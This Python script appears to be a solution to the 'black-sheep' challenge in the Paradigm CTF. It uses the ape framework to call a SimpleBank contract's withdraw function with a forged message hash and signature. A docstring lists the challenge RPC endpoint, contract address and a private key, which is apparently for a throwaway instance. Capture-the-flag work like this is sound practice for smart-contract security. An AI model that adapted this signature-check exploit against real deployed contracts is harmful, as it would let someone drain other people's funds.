#!/usr/bin/python3
import rlp
from ape import accounts, project
from eth_account.messages import encode_defunct
from eth_utils import keccak
from hexbytes import HexBytes

"""
rpc endpoints:
    - http://black-sheep.challenges.paradigm.xyz:8545/8964238a-91cb-417d-af23-9f9e24bce43c/main
private key:        0x0a799df4a83fcff66c47cc51a8c8d883c26f900c7f7589005951224d466787b9
challenge contract: 0xfeF0D20c854c9ccB15c5dE1B0E62B6E451b34f92
"""


def hack():
    attacker = accounts.load("black_sheep")
    attacker.set_autosign(True, passphrase="a")
    challenge = project.Challenge.at("0xfeF0D20c854c9ccB15c5dE1B0E62B6E451b34f92")
    simple_bank = project.ISimpleBank.at(challenge.BANK())

    # while get_addr(attacker) != TARGET_ADDRESS:
    #     # increase the nonce
    #     attacker.transfer(attacker.address, value="1 wei")

    # attack_contract = project.Hack.deploy(simple_bank.address, sender=attacker)

    msg = "I will hack this contract"
    msghash = encode_defunct(text=msg)

    signature = attacker.sign_message(msghash)

    # attack_contract.hack(msghash, signature.v, signature.r.hex(), signature.s.hex(), value="20 ether", sender=attacker)

    msghash = "0x1476abb745d423bf09273f1afd887d951181d25adc66c4834a70491911b7f750"

    simple_bank.withdraw(
        msghash,
        signature.v,
        signature.r,
        signature.s,
        value="0.1 ether",
        sender=attacker,
    )


def main():
    hack()


if __name__ == "__main__":
    main()
